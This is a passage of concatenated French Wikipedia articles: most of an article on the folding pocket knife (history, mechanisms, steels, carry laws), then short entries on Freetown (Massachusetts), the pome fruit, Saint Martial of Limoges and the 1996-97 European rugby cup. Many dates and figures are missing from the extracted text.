On relève ainsi les traductions connues en 1896 de "canif" en gaëlique irlandais ("sgian pheaun"), hébreu ("ta'ar hassofer"), latin (), syriaque ("galaba") ou vieux français ("canivet"). Ce dernier terme est à rapprocher du breton ', du basque "ganibeta", du provençal "ganivet" et du portugais ', cités parmi d'autres langues et dialectes européens comme l'albanais ("tchaki"), le grec moderne ("soughias") et le serbe ("peroreze"). Au chapitre des langues et dialectes asiatiques, Pagé relève, entre autres, le cambodgien "kombet-tauch", le bengali "chakou", le japonais "kogatana" et le laotien "mit-tok". L'Afrique, l'Amérique et l'Océanie ne sont pas en reste avec, par exemple, le malinké "dadié blitounou", le makua "kijiou", l'iroquois "asare iénasas arionatha", le quechua "nahuin", le sioux omaha "mah-hi-zlain-go" et le malais "pisso ketjil". Au total, Pagé recense des termes de coutellerie en ou dialectes qu'il a collectés par courrier auprès des ambassades ou consulats français de par le monde.
Histoire.
Préhistoire.
La lame de pierre taillée laisse la place, à la fin du Néolithique à celles issues de la métallurgie du cuivre, du bronze et enfin du fer.
Un couteau pliant, ayant été mis au jour dans une sépulture, au sud-ouest de la Slovaquie (Veľký Grob), permet d'affirmer l'existence de canifs dès le Premier âge du fer, c'est-à-dire entre le et la fin du .
Le couteau mesure et possède un manche en bois richement décoré ; il est probable qu'il soit l'œuvre de Scythes, originaires de la mer Noire, présents dans la région à la fin du .
Antiquité.
D'après Camille Pagé, des fouilles menées à Rome ont permis la découverte de canifs utilisés par les Romains pour tailler les roseaux servant pour écrire. 
Les Romains, à côté de couteaux fixes, possèdent également des couteaux dont la lame est mobile autour d'un axe et se replie dans une rainure ouvragée dans le manche ; quelques exemplaires font partie des collections du musée d'archéologie nationale et domaine national de Saint-Germain-en-Laye.
Le musée du Louvre possède un manche en os de couteau à lame pliante représentant un gladiateur thrace, datant de la seconde moitié du .
Camille Pagé décrit également la découverte en 1888 à Poitiers d'un couteau pliant de femme ou d'enfant, à manche de bronze de l'époque gallo-romaine.
Selon Alain Bureau, le couteau pliant fait partie de la dotation de base des soldats romains.
Moyen Âge et Époque moderne.
La diffusion des couteaux pliants, à friction à l’origine, débute réellement au début de notre ère ; d’abord auprès des Celtes, ils pénètrent ensuite le quotidien des Romains puis des Gallo-romains, bien que jusqu’à la Renaissance le couteau droit demeure omniprésent.
Selon Adrien Durand, le musée de Cluny et la collection Sauvageot possèdent en 1870 des échantillons de coutellerie datant du Moyen Âge, dont deux couteaux .
Si au Moyen Âge, le "canivet" est inséparable de l'écritoire et sert à tailler les plumes d'oie, ce n’est qu’à partir de la fin du que les couteaux pliants s'imposent réellement, devenant des couteaux de poche.
Plusieurs raisons expliquent cet engouement, par exemple la « pacification » des mœurs sous l’influence des cours italiennes, l’augmentation des déplacements durant lesquels les voyageurs préfèrent s’accompagner de leurs ustensiles personnels plutôt que d’utiliser les couverts des tavernes, ou encore l’évolution vestimentaire qui voit l’apparition de poches extérieures plaquées sur les vêtements plus faciles d’accès que celles qui sont portées au-dessous. L’élément déterminant est l'invention, vers la fin du , du blocage de la lame par une virole.
Au , la majeure partie des couteaux de poche provient des fabriques de Moulins et de Langres et selon Abraham du Pradel en 1692, sont produits à . L’engouement que suscitent les couteaux fermants justifie une production de masse, et par corrélation, un faible coût de production. Ainsi, en 1763 à Saint-Étienne, la grosse de "jambettes" se vend de alors que la même quantité de couteaux de table vaut de la grosse (une livre équivaut à vingt sols).
L'industrie du couteau au pousse à la répartition des tâches et à la spécialisation de la main d'œuvre ; elle occupe, dans le Forez par exemple, des forgerons, des aiguiseurs, des trempeurs, des polisseurs, des presseurs de manches et des monteurs ; les aiguiseurs et les polisseurs sont réunis à proximité de chutes d'eau afin de profiter de leur force motrice, alors que les autres corps de métiers peuvent être installés dans des ateliers séparés. La fabrication des "jambettes" de Saint-Étienne, dont le manche est communément en corne de mouton, nécessite l'intervention de de métiers.
À Thiers, à la même époque, les tâches de coutellerie font intervenir le martinaire qui bat le fer pour l'étirer, le forgeron, le limeur, le perceur, l'émouleur, le polisseur, le plaqueur, le mitreur, le scieur d'os, le blanchisseur qui fait sécher les manches en corne et blanchit l'os, le redresseur de corne (ou cacheur), le monteur, le poseur, l'affileur, l'essuyeuse et enfin le plieur. Les productions de Thiers se vendent dès le à l'étranger, principalement en Espagne et l'Italie, grâce à leur la variété et à la modicité de leur prix.
À Langres, en revanche, les étapes de la fabrication des couteaux ne sont pas divisées entre différents corps de métiers ; chaque ouvrier produit toutes les pièces nécessaires à l'élaboration des couteaux et canifs.
Au , les droits de douane appliqués à la coutellerie relèvent du chapitre de la mercerie. Les tarifs de 1664 et 1692 imposent en effet les mêmes droits d'entrée et de sortie du territoire que pour l'activité des quincailliers qui eux-mêmes relevent du corps des merciers. La notion de "mercier coutellier" apparaît également dans les statuts des couteliers de Châtellerault homologués en 1581. À la suite de l'édit royal de , les couteliers sont associés aux communautés des fourbisseurs et des arquebusiers.
C’est à la fin du qu’apparaît le ressort et c’est du que datent la plupart des mécanismes et des types de canifs connus au .
Révolution et Empire.
À la fin du et au , à la suite de la création en 1794 du Conservatoire national des arts et métiers par l'abbé Henri Grégoire, le relèvement économique de la France est soutenu par l’organisation d’expositions industrielles. La première d’entre elles a lieu à la fin de l’, en au Champ-de-Mars. Un coutelier de Paris, Lepetit Wale, y participe, ainsi qu'à la suivante, en ; il présente . Il faut attendre l'édition de 1823 pour que le vocable « canif » soit clairement mentionné ; l'exposition a lieu dans la colonnade du Louvre, sur deux étages, du au . Le rapport du jury à Jacques-Joseph Corbière, ministre-secrétaire d'État de l'Intérieur, cite , dont .
Lors de l'exposition de 1834, ainsi qu'à celles de 1839, 1844 et 1855, Renodier père et fils présentent des "Jambettes" et des "Eustaches" qui font la réputation de Saint-Étienne.
Ce dernier couteau est un des articles emblématiques des couteliers de Saint-Étienne ; il s'agit d'un couteau pliant à manche de hêtre ou de corne qui se vend en France comme à l’étranger (Espagne, Italie, Angleterre, Portugal). Ce petit couteau s’appelle "Eustache" à Paris, du nom du maître coutelier Eustache Dubois, "Avril" à Amiens et à Rouen, "Descos à la clé" en Bretagne, "couteau d’Ozon" dans le Poitou et la Saintonge, "Damillon" dans le Midi et "Bizalion" en Espagne et en Italie. Alphonse Peyret-Lallier note . Ce couteau se vend par grosse aux détaillants, c’est-à-dire par douze douzaines.
Le rapport du jury de l'exposition de 1839, inaugurée le par le Louis-Philippe et sa famille, relève la présence du coutelier Vauthier, qui . Ce canif se nomme, selon son inventeur, « couteau manchot ».
Dix ans plus tard, le rapport de l'exposition de 1849 rapporte, outre la présence de M. Vauthier et de ses couteaux s'ouvrant d'une seule main, la présentation de Louis-Célestin Carton qui a .
À l'initiative de l'Angleterre s'ouvre en 1851 la première Exposition universelle ; celle-ci n'accueille qu'un seul coutelier français (Paris), mais durant celle de 1862, à Londres encore, la participation de J. Charrière est remarquée pour ses . Le rapport de l'Exposition universelle de 1862 indique qu'à Thiers, .
À la fin de l’Empire, de nombreux centres couteliers français ont disparu, victimes des guerres de la Révolution et des suivantes, et de leurs conséquences économiques, le charbon, l'acier, l'ébène et les meules faisant défaut ; il en va ainsi des coutelleries de Cosne, Nevers, Caen, Le Chambon-Feugerolles, Toulouse et partiellement de Moulins. Celles de Châtellerault, Langres, Nogent, Paris, Saint-Étienne et Thiers ont pu résister grâce à une implantation plus solide.
Technologie.
On distingue les couteaux à clous, dits également « à friction » des couteaux à ressort .
Les couteaux à clous.
Les couteaux à clous se subdivisent eux-mêmes en deux catégories. Un premier groupe rassemble les canifs à un clou, qui traverse la lame et forme une goupille qui permet à celle-ci de se replier dans le manche. Le second groupe concerne les canifs à deux clous.
Les couteaux à un clou.
Lorsque la lame de ces canifs est en position ouverte, elle est maintenue dans cette situation droite par un talon , et encore aujourd’hui pour le couteau de type piémontais qui s’appuie sur la tête du manche. Il s’agit du modèle le plus ancien, déjà utilisé par les Romains. Déjà, aux premiers siècles de notre ère, les artisans ajoutent une bague métallique qui enserre la tête du manche, pour la protéger de l’éclatement de la matière autour du rivet, provoqué par le travail de la lame au métal plus dur que la tête du manche, en bois, en corne ou en os.
Ce système se retrouve sur de nombreux couteaux européens tels que l'Opinel en France, le Taramundi espagnol, le Parrada et l’Arburese italiens ou le Palaçoulo portugais. L’Higonokami japonais est également un couteaux à un clou, muni d'une lentille. C'est également la technique employée pour l"Eustache Dubois", composé simplement d'une lame, d'un manche en bois et d'un clou.
Dès le , des couteaux de jardiniers sont équipés d’une bague rotative, ou virole tournante, maintenue par le guichet de la virole fixe du manche ; celle-ci permet de bloquer la lame en position ouverte, en créant un cran d’arrêt, ou fermée.
Cette technique est reprise en France, par les Opinels à partir de 1955, ainsi que d’autres couteaux savoyards, et les couteaux de Nontron et en Italie par certains canifs de Bergame.
Le canif à lentille fait également partie de la famille des couteaux à un clou ; le talon de la lame est prolongé par une excroissance plate ou en forme de boule qui vient se poser ou s’encastrer sur le dos du manche lorsque le couteau est en position ouverte. Il est illustré par le couteau dit « piémontais ».
Les couteaux à deux clous.
L’inconvénient de la lentille ou du bouton réside en ce que cette partie déborde du manche lorsque le canif est fermé ; elle peut alors blesser la main ou déchirer la poche. À cet effet, les couteliers ont imaginé de retrancher le bouton et de former au talon de la lame une dent ou une échancrure qui s’appuie, en position ouverte, sur un second clou.
Comme pour le couteau à un clou, une goupille ou une rosette bombée sert d’axe à la lame. Le second clou sert de butée au talon de la lame lorsqu’elle est ouverte. Ces couteaux sont connus sous les dénominations « à la capucine », « capucin » ou « couteau de berger des Pyrénées ».
Les couteaux de bergers corses, dont la production est relancée depuis les , font également partie de cette famille. D’origine génoise, ils possèdent une lame large à la pointe relevée, dont le contre-tranchant est usiné en tarabiscot, et un manche courbe.
Les couteaux à ressort.
Dans le but de protéger la lame et le tranchant de celle-ci, les artisans de la fin du et du inventent un procédé par lequel la lame, tout en pivotant sur son axe, rentre dans le manche en appuyant sur un ressort auquel elle est fixée, ce dernier glissant dans une rainure pratiquée à l’intérieur du manche ; ces canifs sont également nommés "canifs à coulisse".
Le ressort connu au est une pièce métallique positionnée sur le dos du manche ; elle immobilise la lame en position ouverte ou fermée. Dans le cas d’un couteau à cran d’arrêt, le ressort est parfois accompagné d’une pompe d’arrêt, qui est un dispositif de déblocage par pression d’un épaulement situé également sur le dos du manche.
Le couteau à mouche, dont le laguiole est un exemple, dispose dans le talon de la lame d’un tenon qui s’arrête sur une épaisseur du ressort ; ainsi, la lame ne peut se refermer que lorsque le ressort est repoussé vers l'arrière. Le couteau à pompe est également un canif à mouche, le ressort est alors d'une seule pièce et un second ressort intérieur le ramène en position initiale.
Le type "couteau à ressort" a été décliné en plusieurs modèles. On connait par exemple le couteau "à la berge", du nom d’un coutelier de Paris ; il désigne un couteau à deux lames, pivotant en compas sur le même talon et dont l’ouverture se fait indépendamment. Quand les deux lames sont fermées, leurs pointes reposent sur un entre-deux fixé entre les côtes du manche.
Si les lames dépendent l’une de l’autre pour leur ouverture ou leur fermeture, de sorte qu’elles ne puissent être simultanément ouvertes ou fermées, il s’agit alors d’un couteau "à bascule" ou "à béquille" ; bien qu'il s’agisse d’un couteau fermant, ce couteau "à bascule" doit être enserré dans une gaine pour être transporté aisément. Les lames de ces deux couteaux sont de métaux différents, pour l’usage de la table ; l’une est en acier, pour couper les aliments les plus durs tels que le pain et la viande, et la seconde en or ou en argent pour peler ou découper les fruits.
Le "couteau compliqué", ancêtre des couteaux multi-outils, fait également partie de cette catégorie. Il s’agit, à l’origine d’un couteau pliant qui se compose, outre sa lame, .
Lors de l’exposition industrielle de 1820, un coutelier de Langres, Charles Guerre, expose un "couteau nécessaire" présentant dont avec un ressort.
Les couteaux à secret.
Un couteau pliant à secret est un canif dont la fermeture ou l’ouverture de la lame ne peut se faire sans un dispositif dissimulé particulier.
Jean-Jacques Perret décrit, dans le chapitre consacré aux différents couteaux fermants de son ouvrage intitulé "L'art du coutelier", publié en 1771, l'ajustement de couteaux à différents secrets.
Selon lui, le plus simple d’entre eux consiste à faire monter ou descendre la lame, dont la pointe, lorsqu’elle est en position basse, vient se positionner dans une échancrure du bout du ressort (voir la ). Il suffit donc, dans ce cas, que le trou de l’axe de la lame possède une forme allongée dans le sens de celle-ci.
Le couteau à mouche, dit également "à loquet", dans son acception ancienne est également un couteau à secret, grâce au tenon laissé au talon de la lame (voir le détail « N » de la figure 17). Il ne peut se refermer qu’en tirant le ressort avec le pouce.
Le couteau "à grimace" est similaire au couteau à mouche, mais le ressort est fixé par un tenon qui s'insère dans un trou de l’une des côtes ou de l’une des platines. Une rosette large et forte cache un trou en long pratiqué sur le manche pour faciliter son écartement.
Le couteau à pompe, décrit par la utilise deux ressorts pour bloquer et débloquer la lame en position ouverte (ressort de la basculant en « R ») et fermée (ressort de renvoi de la , ajusté en queue d'aronde sur le ressort principal en « S »).
Le couteau à secret dit "sous la rosette" utilise une bascule, cachée dans le manche, qui s’ajuste sur une platine possédant un tenon qui vient pénétrer deux trous pratiqués au talon de la lame. L’ouverture et la fermeture de la lame s’effectuent en poussant ou en tirant sur la rosette.
On compte également parmi les couteaux à secret le couteau dit "à bille". Il s’agit en fait d’un rivet à tête plate qui se déplace dans une coulisse, pratiquée dans le talon de la lame, sous l’action de la pesanteur ; lorsque la pointe de la lame est dirigée vers le haut, le rivet descend et la lame s’ouvre lorsqu’une pression est exercée sur le dos de celle-ci ; de la même façon, il faut que la pointe soit vers le bas pour que l’échancrure de la lame reçoive à nouveau le rivet qui la maintient en position fermée.
Typologie des lames.
La coutellerie utilise principalement des aciers au carbone et des aciers dits « inoxydables » à forte proportion de chrome pour la fabrication des lames. Chacune des deux variétés d’acier se déclinent en diverses sous-catégories.
Les aciers au carbone, composés uniquement de fer et de carbone, sont les plus faciles à travailler et à tremper. Le taux de carbone peut varier de 0,3 % à 1 %, les nuances comprises entre 0,5 % et 0,8 % de carbone étant les plus faciles à travailler.
En France, la norme de l’Association française de normalisation (AFNOR) établit une convention de nommage des aciers. Un acier au carbone est désigné par les lettres XC suivies du taux de carbone multiplié par 100 : ainsi l’acier est un acier dur comportant 0,65 % de carbone.
La norme américaine définie par l’"American Iron and Steel Institute" (AISI) est également très simple d’utilisation : pour les aciers au carbone, le sigle se compose d’un « 1 » suivi du taux de carbone contenu dans l’acier. Ainsi l’ dans la norme AFNOR se transpose en 1035 dans la norme US AISI.
Les aciers ayant les plus faibles taux de carbone, comme les et ne sont utilisés pratiquement que pour réaliser les lames en Damas ou pour les aciers destinés à la cémentation, leurs propriétés de trempe étant trop faible. Les lames courtes ou moyennes des couteaux pliants demandant un tranchant dur justifient l'emploi de l' ou de l' ; la forge de ces deux nuances fortement carburées est délicate compte tenu de la dureté des aciers et des réactions capricieuses à la chaleur.
L’utilisation des aciers alliés date du début du et s'accroit fortement après la Seconde Guerre mondiale, l'ajout de différents éléments d’alliage améliorant selon les cas la résistance à la casse, l’inoxydabilité ou les procédés de trempe. Le seuil de 5 % d’ajouts dans la composition du métal départage les aciers faiblement alliés des aciers fortement alliés. La norme AFNOR nomme ces nuances d’acier par le taux de carbone multiplié par cent, suivi des éléments d’alliage par ordre décroissant de teneur. Chaque élément est désigné par son symbole chimique accompagné d'un coefficient multiplicateur spécifique. Pour la norme AFNOR la dénomination des aciers fortement alliés commence par un Z.
La norme américaine désigne d’abord la première caractéristique de l’acier par une lettre , suivie du code de l’élément additionnel principal. Ainsi l’acier désigne un acier fortement chromé ; son équivalent AFNOR est .
Pour des raisons d’hygiène, les coutelleries industrielles emploient presque exclusivement des aciers inoxydables pour la fabrication des lames.
Pour décrire la lame d'un couteau pliant, on distingue la pointe, le tranchant, le dos et le talon qui relie la lame au manche par l'intermédiaire d'un axe.
Patrimoine culturel.
Le canif dans la culture populaire.
On trouve dans "Le livre des proverbes français" de Le Roux de Lincy un proverbe du , rappelant l'importance de la navigation sur la Vienne pour le commerce de la coutellerie à Châtellerault :
Records et excentricités.
Dès 1849, les frères Petit de Nontron exposent des couteaux nains suffisamment miniaturisés pour qu'une coquille de noix ou de noisette puisse en contenir chacune douze. Ces couteaux sont en vente courante à la fin du . Les mêmes couteliers sont parvenus à insérer pliants en état de fonctionnement dans un noyau de cerise.
Législation.
Suivant les pays, la définition d'un couteau comme arme et le droit de port qui lui est lié sont très divergents.
Ainsi pour la Grande-Bretagne est considéré comme arme .
La législation irlandaise est également très restrictive.
De manière générale, les couteaux pliants classiques sont autorisés, sous réserve parfois de critères relatifs au blocage de la lame ou à la taille de celle-ci.
Par exemple, la loi fédérale suisse sur les armes, les accessoires d'armes et les munitions du précise dans son que .
Les couteaux de type papillon font, en revanche, l'objet d'une interdiction de port et parfois d'importation quasi générale. C'est le cas de l'Allemagne, de la Belgique et de la Suisse, et implicitement de la Grande-Bretagne, de l'Irlande, du Danemark et de l'Italie. L'Espagne fait exception.
Enfin, le type d'ouverture est également un critère considéré par les législations locales. Ainsi, au Canada, les couteaux sont interdits. Selon Gildas Roussel en 2009, il est probable que cette mesure, concernant les couteaux à ouverture assistée, soit suivie par les juridictions européennes dans un proche avenir.
De plus, la loi danoise prohibe explicitement les couteaux dont l'ouverture peut se faire d'une seule main ; elle est rejointe implicitement sur ce point par la loi suisse.
Il découle de ce qui précède que, pour la plupart des pays, un canif petit ou moyen sans blocage de lame ni ouverture assistée est tout à fait légal de port, qu'il soit à un ou deux clous, ou à cran forcé.
Certains producteurs de canifs prennent désormais en compte dans leurs cahiers des charges les restrictions réglementaires nationales. C’est le cas, par exemple, du coutelier présentant la marque "Spyderco" qui produit des couteaux spécifiquement destinés au marché britannique et au marché danois, le "DK penknife". D’autres couteliers n’ont pas tardé à lui emboiter le pas, comme l’artisan belge Éric Parmentier ou la firme suédoise Fallkniven pour leur pays respectif.
Les attentats du ont durci les législations nationales et imposé des restrictions de port pour les couteaux pliants de tous types, lors de l'accès aux avions de ligne commerciale, supplantant dans ces zones les règlements généraux.
En France.
La loi du distingue les armes, même tranchantes, des . Jusqu’en 1994, le code pénal français suit la loi de 1804, considérant que .
Dans le cadre français contemporain, le couteau étant défini comme une arme blanche de , son port est interdit sans distinction de la longueur de la lame. En effet, l’ du décret de 1995 classe en , .
Cette définition ne distingue pas les couteaux fixes des couteaux pliants. En effet, la catégorie des couteaux-poignards semble englober les couteaux pliants qui dispose d’un système de blocage de la lame lui assurant une rigidité proche de celle d’un couteau fixe. Cette interprétation est suivie de façon constante par les tribunaux qui incluent dans cette catégorie les couteaux à virole de type Nontron et Opinel, ainsi que les Balisongs et certains couteaux piémontais quand la mouche à l'arrière de la lame est longue et donc de nature à assurer un blocage puissant. Les couteaux dépourvus de système de blocage, y compris les couteaux à cran forcé comme les Laguioles, ne sont pas qualifiés d'arme de .
Outre le port d'un canif, la loi prévoit la liberté d'acquisition et de détention des armes de pour les personnes majeures. Elle ne limite pas le nombre d'armes blanches acquises ce qui fait de la collection une activité autorisée.

</doc>
<doc id="248823" url="https://fr.wikipedia.org/wiki?curid=248823" title="Freetown (Massachusetts)">
Freetown (Massachusetts)

Freetown est une ville du Massachusetts, aux États-Unis. Elle est située dans le comté de Bristol. Lors du recensement de 2010, sa population était .
La ville a deux villages: Assonet et East Freetown

</doc>
<doc id="248825" url="https://fr.wikipedia.org/wiki?curid=248825" title="Piridion">
Piridion

Un piridion, appelé aussi péridium ou péridion (du grec ancien ', pêridion « petit sac », diminutif de ', qui donne le latin "" « besace »), est un fruit complexe, constitué par le réceptacle floral devenu charnu, soudé à l'ovaire. C'est une structure que l'on retrouve lorsque la fleur possède un ovaire infère adhérant au réceptacle, comme chez la pomme, la nèfle ou la poire.
Ce fruit est caractéristique des plantes à ovaire infère de la sous-famille des "Maloideae" (famille des Rosacées), notamment le pommier, le néflier, le poirier, le cognassier, l'aubépine, l'amélanchier, le cormier et les autres sorbiers

</doc>
<doc id="248831" url="https://fr.wikipedia.org/wiki?curid=248831" title="Martial de Limoges">
Martial de Limoges

 Martial de Limoges ou saint Martial (), également appelé l’"apôtre des Gaules" ou l’"apôtre d'Aquitaine", est selon la tradition le premier évêque de Limoges.
Fondateur de l'Église d'Aquitaine, fêté le 30 juin, il est le saint patron éponyme de multiples villes, villages et lieux de cultes catholiques, dont le plus renommé est l'abbaye Saint-Martial de Limoges. Son culte reste aussi très populaire en Limousin.
Si les traditions et les légendes le concernant convergent sur de nombreux points, la chronologie a donné lieu à deux versions nettement différentes. Selon la plus ancienne trace écrite, Martial ferait partie des sept missionnaires qui, au temps de la persécution de Dèce autour de 250, auraient été envoyés évangéliser la Gaule par « les évêques de Rome ». Au , un écrit fait remonter Martial au , envoyé en Gaule par le premier pape Pierre. Après la guérison du mal des ardents attribuée à son intercession en 994, le prédicateur de Saint-Martial de Limoges, Adémar de Chabannes, développe ce second récit. Longtemps défendue par l'Église catholique, cette thèse, mise en cause par des historiens, n'est définitivement abandonnée qu'au début du .
Conservées à l'église Saint-Michel-des-Lions de Limoges, les reliques de saint Martial donnent lieu à d'importantes ostensions septennales.
Premières versions de la légende.
Les mentions écrites les plus anciennes relatives à Martial de Limoges datent du début du Moyen Âge. Sidoine Apollinaire, évêque de Clermont au , affirme qu’"Augustoritum" (ancien Limoges) reçut Martial comme évêque.
Selon Grégoire de Tours, dans le livre I de son ' "(Histoire des Francs)", Martial de Limoges ferait partie des sept missionnaires qui, au temps de la persécution de Dèce autour de 250, auraient été envoyés en Gaule par « les évêques de Rome » pour évangéliser la Gaule. En réalité, lHistoire des Francs" de Grégoire de Tours amalgame des récits d'origines, de dates et de valeurs différentes, pour raconter l'histoire légendaire de ces sept missionnaires : Martial de Limoges, Gatien de Tours, Trophime d'Arles, Paul de Narbonne, Saturnin de Toulouse, Denis de Paris, Austremoine de Clermont. La fondation des premiers évêchés n'est en effet connue le plus souvent que par des traditions locales tardives et légendaires qui visent à prouver l'antériorité d'un siège par rapport à un autre.
Une première vie de Martial, appelée "" "(Vie primitive)", datant d'avant 846, est rédigée au par un membre du clergé limousin. D'après elle, Martial aurait vécu au et aurait été envoyé en Gaule par saint Pierre.
Traces archéologiques.
On sait que le premier évêque fut inhumé dans le cimetière situé près de la "via Agrippa".
Sur son tombeau fut construite au début du Moyen Âge une abbaye, étape sur la route du pèlerinage de Saint-Jacques-de-Compostelle.
Dans les années 1960, des fouilles sont effectuées à Limoges sur l'emplacement de l'ancienne abbaye Saint-Martial, à l'occasion du creusement d'un parking souterrain sous la place de la République. Dans les restes d'une crypte, un tombeau attribué au saint est découvert ainsi qu'une mosaïque du Haut-Empire témoignant de l'importance du personnage inhumé.
Saint Martial apôtre des Gaules.
Du « miracle des ardents » à la Vie d'Adémar de Chabannes.
Lors d'une crise de mal des ardents en 994, les reliques de saint Martial font l'objet d'ostensions auxquelles les contemporains attribuent le reflux de l'épidémie. Quelques années après, au début du , le prédicateur Adémar de Chabannes développe une nouvelle vie de Martial de Limoges, connue sous le nom de "" (littéralement « vie plus développée »), appelée aussi "Vie récente".
Cette "Vie récente" est produite lors des conciles de Limoges de 1029 et 1031, présidés par l'évêque de Limoges Jourdain de Laron, puis de celui de Bourges. Elle obtient une large diffusion et des éditions imprimés paraissent dès le . Placé au rang des apôtres par Jean XIX (1024-1032), saint Martial draine un courant de pèlerinages fructueux pour l’abbaye Saint-Martial de Limoges et la ville.
Contenu de la Vie écrite par Adémar de Chabannes.
Selon cette version largement répandue, Martial aurait été de la tribu de Benjamin et proche parent en ligne droite du premier martyr saint Étienne. Il serait né près de Ramah, dans un village ou l'on voyait encore au une église qui lui était dédiée. À peine âgé de quinze ans, il se serait mis à la suite de Jésus-Christ, qu'il n'aurait plus quitté, tout en s'attachant particulièrement à saint Pierre.
Ainsi Adémar de Chabannes écrit : « Martial vécut au temps de Jésus et le suivit avec sa famille dès sa plus tendre enfance. Il reçut le baptême dans les eaux du Jourdain. (...) Jésus prit pour exemple le petit Martial en prononçant ces paroles : " Si vous ne vous rendez pas semblables à cet enfant, vous n'entrerez pas dans le royaume des cieux " (Mt XVIII, 3). Martial est le petit garçon qui apporta les poissons lors de la multiplication des pains dans le désert ».
Dans le même but, Adémar de Chabanne rapporte le récit de multiples miracles.
« Il suivit le Christ jusqu’à Jérusalem où il servit lors de la Cène. Auparavant, Jésus aurait demandé à saint Pierre d’envoyer Martial en Gaule. Avec deux compagnons, Alpinien et Austriclinien, Martial, le bâton de saint Pierre à la main, partit évangéliser le peuple des Lémovices. Sur le chemin, Austriclinien mourut – on ne sait de quoi –, Martial prit son bâton et toucha son compagnon défunt qui ressuscita. Il entra sur la terre du Limousin par Toulx, il y guérit une possédée qui était la fille d’Arnulfus ainsi qu'un jeune garçon, le fils de Nerva, qui allait périr étouffé ; les habitants, devant les miracles accomplis, se convertirent ».
« Sur sa route, vers "Augustoritum", il traversa Ahun où il rendit la vue à des prêtres païens qui l’avaient molesté, c’est alors que le démon sortit d’une statue de Jupiter qui se brisa. Martial guérit un paralytique qui lui avait demandé de l’aide. Le Christ apparut à Martial, lui ordonnant de quitter la ville d’Ahun pour continuer sa mission : “Ne crains pas de descendre à Limoges, où je te glorifierai et serai toujours avec toi.” Arrivant dans la capitale des Lémovices, Martial guérit un dément en présence de son hôtesse Suzanne et de sa fille Valérie. Mais deux prêtres païens, André et Aurélien, firent emprisonner les trois compagnons ; les deux gallo-romains furent frappés par la foudre qui les tua. Martial les ressuscita, puis aussitôt après les deux païens confessèrent tous leurs péchés. Après le miracle de sainte Valérie – voir ci-dessous –, Martial ressuscita son bourreau et Hildebert, fils du comte de Poitiers, qui s’était noyé dans la Vienne. Les trois évangélisateurs partirent convertir le reste de l’Aquitaine, ils arrivèrent à Bordeaux où Martial guérit Sigisbert, comte de la cité, qui était paralysé. La ville fut alors victime d’un incendie, mais Martial de son bâton éteignit le feu. Il partit alors pour Poitiers où le Christ lui apparut, annonçant les martyres de saint Pierre et saint Paul ; quelque temps plus tard, il lui réapparut, lui affirmant qu’il allait bientôt mourir. Martial retourna à Limoges et choisit comme successeur Aurélien de Limoges, l’ancien prêtre païen ; l’évangélisateur mourut lors d’une messe à laquelle assistaient de nombreux fidèles qui virent l’âme de l’apôtre s’élever vers le ciel. Le premier évêque de Limoges fut enterré hors de la ville ; sur le parcours du cortège funèbre un paralytique fut guéri, le premier d’un long cortège de malades qui viendraient demander leur guérison sur le tombeau de saint Martial ».
Affirmation et contestation de l'apostolicité de Martial.
Les premières versions imprimées sont reprises au par le père Bonaventure de Saint-Amable (v. 1610-1691) dont l'œuvre est à l'origine des multiples biographies de saint Martial et de sainte Valérie publiées au .
Martial reste vénéré comme apôtre jusqu'en 1850 dans la liturgie de l'Église limousine. Cette apostolicité, maintenue par la sacrée congrégation des rites, est confirmée par décret du de Pie IX. En 1855, elle reste défendue à Limoges même par le chanoine François Arbellot, membre de la Société archéologique et historique du Limousin, dans sa "Dissertation sur l'apostolat de saint Martial et l'antiquité des églises de France".
Bien que la thèse de l'apostolicité soit dénoncée dès le , il faudra attendre les travaux de Charles de Lasteyrie, puis d'Alfred Leroux, qui démontrent l'action d'Adémard de Chabannes, pour clore le débat sur l'apostolicité de saint Martial. Cette affirmation est finalement abandonnée par l'Église catholique au début du .
Héraldique.
Le portrait et les initiales de saint Martial figurent sur le blason de la ville de Limoges et il est également cité dans la devise de la ville : "Dieus gart la vila e sent Marsals la gent" (occitan) : "Dieu garde la ville et saint Martial le peuple".
Le culte.
La reconnaissance de Martial comme apôtre renforce le succès du pèlerinage à Limoges. L'abbatiale romane dédiée au Sauveur était une des plus belles églises du sud de la France. La bibliothèque des moines, en grande partie conservée à la Bibliothèque nationale de France, est d'une grande richesse, les enluminures des manuscrits sont de magnifiques témoins de l'art roman. Les émaux qui y étaient produits eurent une renommée immense dans l'Occident chrétien.
Dès la fin du , de nombreuses confréries voient le jour pour honorer saint Martial et participer à son culte autour de ses reliques. La première fut celle "du Luminaire devant le sépulcre", puis, celles "des Oboles", celle de Saint-Martial-du-Sépulcre" et la grande confrérie de saint Martial, la seule subsistante de nos jours.
Le culte de saint Martial se perpétue encore aujourd'hui lors d'ostensions, qui se déroulent tous les sept ans à Limoges. Les plus récentes ont eu lieu en 2023, toujours lors de la fête de la Divine Miséricorde, c'est-à-dire le samedi et le dimanche qui suivent Pâques.

</doc>
<doc id="248835" url="https://fr.wikipedia.org/wiki?curid=248835" title="Coupe d'Europe de rugby à XV 1996-1997">
Coupe d'Europe de rugby à XV 1996-1997

La Coupe d'Europe de rugby 1996-1997 réunit des participants irlandais, italiens, gallois, français et pour la première fois des clubs écossais et anglais. De ce fait, le petit poucet de la première édition, le club roumain champion de la "divizia A", disparaît de la compétition et participe à la Conférence européenne dont c'est la première édition.
Les formations s'affrontent dans une première phase de poules. Il y a quatre poules de cinq clubs qui se rencontrent tous une fois. Chaque club joue quatre matches (deux à domicile et deux à l'extérieur). En matches de poules, 2 points sont accordés pour une victoire, un pour un nul et rien pour une défaite. Les deux premiers de chaque poule sont qualifiés pour la phase suivante. En cas d'égalité de points de classement, les clubs sont départagés par les différences de points marqués.
La phase finale présente cette année un échelon de plus avec l'apparition des quarts de finale. Cette phase se poursuit entre les clubs qualifiés par élimination directe.
Phase qualificative.
Notations.
Signification des abréviations des tables de classement :
Bilan de la première phase.
Avec l'apparition des clubs anglais, la répartition des places pour la seconde phase de la compétition se rééquilibre selon la force des nations : trois clubs français, trois clubs anglais et deux clubs gallois. Aucune province irlandaise ne se qualifie pour la phase éliminatoire. Enfin, les Écossais et les Italiens, aux dernières places des poules, jouent les "sparring partners".

</doc>
<doc id="248836" url="https://fr.wikipedia.org/wiki?curid=248836" title="Entreprise locale de distribution d'électricité et de gaz (France)">
Entreprise locale de distribution d'électricité et de gaz (France)

